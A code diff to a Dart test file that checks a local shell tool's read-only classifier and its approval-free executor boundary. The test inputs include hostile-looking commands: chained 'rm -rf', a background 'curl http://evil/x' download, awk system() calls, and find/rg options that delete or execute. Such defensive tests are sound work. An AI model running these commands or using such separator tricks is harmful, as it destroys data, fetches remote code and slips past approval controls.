@@ -91,38 +91,96 @@ void main() {
     );
   });
 
-  test('marks simple inspection commands as read-only', () {
-    expect(LocalShellTools.isReadOnly('pwd'), isTrue);
-    expect(LocalShellTools.isReadOnly('ls -la'), isTrue);
-    expect(
-      LocalShellTools.isReadOnly(
-        "ls -R && echo '--- pubspec.yaml content ---' && cat pubspec.yaml",
-      ),
-      isTrue,
+  group('approval-free internal execution boundary', () {
+    test('allows bounded internal inspection commands', () {
+      expect(LocalShellTools.isReadOnly('pwd'), isTrue);
+      expect(LocalShellTools.isReadOnly('ls -la'), isTrue);
+      expect(
+        LocalShellTools.isReadOnly(
+          "ls -R && echo '--- pubspec.yaml content ---' && cat pubspec.yaml",
+        ),
+        isTrue,
+      );
+      expect(LocalShellTools.isReadOnly('rg ChatPage lib'), isTrue);
+      expect(LocalShellTools.isReadOnly('find lib -name *.dart'), isTrue);
+    });
+
+    test('rejects every shell-backed inspection command', () {
+      expect(LocalShellTools.isReadOnly('git status --short'), isFalse);
+      expect(LocalShellTools.isReadOnly('grep needle pubspec.yaml'), isFalse);
+      expect(LocalShellTools.isReadOnly('stat pubspec.yaml'), isFalse);
+      expect(LocalShellTools.isReadOnly('file pubspec.yaml'), isFalse);
+      expect(
+        LocalShellTools.isReadOnly(
+          "awk 'BEGIN { system(\"touch marker\") }' /dev/null",
+        ),
+        isFalse,
+      );
+      expect(
+        LocalShellTools.isReadOnly("sed -n '1w output.txt' pubspec.yaml"),
+        isFalse,
+      );
+      expect(
+        LocalShellTools.isReadOnly('sed -i s/foo/bar/g file.txt'),
+        isFalse,
+      );
+    });
+
+    test('rejects mutating or shell-heavy commands', () {
+      expect(LocalShellTools.isReadOnly('flutter test'), isFalse);
+      expect(LocalShellTools.isReadOnly('rm -rf build'), isFalse);
+      expect(LocalShellTools.isReadOnly('rg ChatPage lib | head'), isFalse);
+      expect(
+        LocalShellTools.isReadOnly(r'echo $CAVERNO_SESSION_LOG_DIR'),
+        isFalse,
+      );
+    });
+
+    test(
+      'keeps unsupported find and rg options inside the bounded executor',
+      () async {
+        final tempDir = await Directory.systemTemp.createTemp(
+          'local_shell_option_boundary_test_',
+        );
+        addTearDown(() async {
+          if (tempDir.existsSync()) {
+            await tempDir.delete(recursive: true);
+          }
+        });
+        final marker = File('${tempDir.path}/marker.txt')
+          ..writeAsStringSync('keep');
+
+        for (final command in ['find . -delete', 'rg --pre touch needle .']) {
+          final result = await LocalShellTools.executeResult(
+            command: command,
+            workingDirectory: tempDir.path,
+          );
+          final payload = jsonDecode(result.result) as Map<String, dynamic>;
+
+          expect(payload['executed_internally'], isTrue, reason: command);
+          expect(payload['exit_code'], isNot(0), reason: command);
+        }
+        expect(marker.existsSync(), isTrue);
+      },
     );
-    expect(LocalShellTools.isReadOnly('rg ChatPage lib'), isTrue);
-    expect(LocalShellTools.isReadOnly('git status --short'), isTrue);
   });
 
-  test('marks mutating or shell-heavy commands as requiring approval', () {
-    expect(LocalShellTools.isReadOnly('flutter test'), isFalse);
-    expect(LocalShellTools.isReadOnly('rm -rf build'), isFalse);
-    expect(LocalShellTools.isReadOnly('rg ChatPage lib | head'), isFalse);
-    expect(
-      LocalShellTools.isReadOnly(r'echo $CAVERNO_SESSION_LOG_DIR'),
-      isFalse,
-    );
-    expect(LocalShellTools.isReadOnly('sed -i s/foo/bar/g file.txt'), isFalse);
-    expect(
-      LocalShellTools.isReadOnly('grep foo bar & rm -rf /tmp/caverno_probe'),
-      isFalse,
-    );
-    expect(
-      LocalShellTools.isReadOnly(
-        'awk "{print}" f & curl http://evil/x -o /tmp/z',
-      ),
-      isFalse,
-    );
+  group('historical lexical separator regressions', () {
+    test('rejects a background separator before a destructive command', () {
+      expect(
+        LocalShellTools.isReadOnly('grep foo bar & rm -rf /tmp/caverno_probe'),
+        isFalse,
+      );
+    });
+
+    test('rejects a background separator after an interpreter', () {
+      expect(
+        LocalShellTools.isReadOnly(
+          'awk "{print}" f & curl http://evil/x -o /tmp/z',
+        ),
+        isFalse,
+      );
+    });
   });
 
   test('detects direct git writes in local shell commands', () async {
